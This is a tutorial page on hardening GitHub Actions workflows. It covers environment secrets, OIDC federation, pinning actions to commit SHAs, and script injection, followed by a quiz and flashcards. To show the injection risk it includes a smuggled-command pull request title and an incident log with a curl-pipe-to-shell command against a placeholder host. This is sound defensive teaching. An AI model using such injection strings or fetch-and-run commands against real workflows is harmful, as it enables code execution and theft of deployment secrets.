---
title: GitHub Actions: secrets, OIDC and hardening
minutes: 14
summary: Protect secrets in Actions, replace long-lived cloud keys with OIDC, pin third-party actions and limit what pull requests can do.
---

A workflow is code that runs with credentials, so it deserves the same care as production access. The main risks are leaked secrets, malicious third-party actions and untrusted input reaching a shell, and each has a clear defense.

## What you will learn

- Storing secrets at the right scope and keeping them out of logs
- Using OIDC instead of long-lived cloud keys
- Pinning third-party actions and limiting token scope
- Avoiding script injection from untrusted input

## Secrets

Secrets can be set at repository, environment or organization level. Prefer **environment secrets** for production, with required reviewers so a person approves before a job gets them. Secrets are masked in logs, but masking is not protection: a script can transform a secret and print it. Never echo secrets, and give each job only the ones it needs.

## OIDC instead of stored keys

```yaml
permissions:
  id-token: write
  contents: read
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/ci-deploy
          aws-region: eu-west-1
      - run: aws sts get-caller-identity
```

With **OpenID Connect**, the workflow requests a short-lived signed token and the cloud provider exchanges it for temporary credentials. The cloud role's trust policy limits which repository, branch or environment may assume it. No long-lived access key is stored in the repository, so there is nothing to leak or rotate.

## Pin and restrict

Third-party actions run with your job's access. Pin them to a full commit SHA, review updates, and let automated dependency updates propose new versions. Set `permissions:` to the minimum and require approval for workflows from first-time outside contributors.

## Script injection

```yaml
# Unsafe: the title becomes part of the shell script
- run: echo "${{ github.event.pull_request.title }}"

# Safer: pass it as data through an environment variable
- run: echo "$TITLE"
  env:
    TITLE: ${{ github.event.pull_request.title }}
```

Expressions in `${{ }}` are substituted into the script **before** the shell runs. A title such as `"; curl evil.sh | sh #` becomes code. Treat titles, branch names, issue text and commit messages as untrusted and pass them through environment variables.

## Incident: A pull request title ran a command

> **Incident:** A crafted pull request title executed shell code inside a workflow.

```console
Run echo "Fix typo"; curl http://x.example/s | sh #"
% Total  % Received
secret DEPLOY_TOKEN exposed to external host
```

The workflow echoed the title with an inline expression. The attacker's title closed the string and ran a download. The fix was to pass the title through an environment variable, move deployment secrets to a protected environment, rotate the token and add a review rule for workflows triggered by outside contributors.

## Common mistakes

- Interpolating untrusted text into shell lines
- Storing long-lived cloud keys when OIDC is available
- Using third-party actions by tag only
- Granting write permissions by default

```quiz
Q: What does OIDC remove from a repository?
+ Long-lived cloud access keys
- The workflow file :: No.
- Branches :: No.
- Runners :: No.
> Short-lived tokens replace stored keys.

Q: What is the safest way to use untrusted input in a script?
+ Pass it as an environment variable
- Inline it in the command :: No.
- Print it first :: No.
- Store it in a secret :: No.
> Expressions are substituted before the shell runs.

Q: Why pin actions to a commit SHA?
+ A tag can be moved to different code
- SHAs run faster :: No.
- Tags are invalid :: No.
- It hides logs :: No.
> A SHA is immutable. The lesson section above explains why.

Q: What permission lets a job request an OIDC token?
+ id-token: write
- contents: write :: No.
- packages: read :: No.
- actions: none :: No.
> The job asks for an identity token.
```

```cards
OIDC :: Federation that trades a signed token for temporary cloud credentials
Environment secret :: A secret gated by an environment's protection rules
Script injection :: Untrusted text becoming executable code in a shell step
SHA pin :: Referencing an action by full commit hash
Trust policy :: Cloud rule saying which workflows may assume a role
```
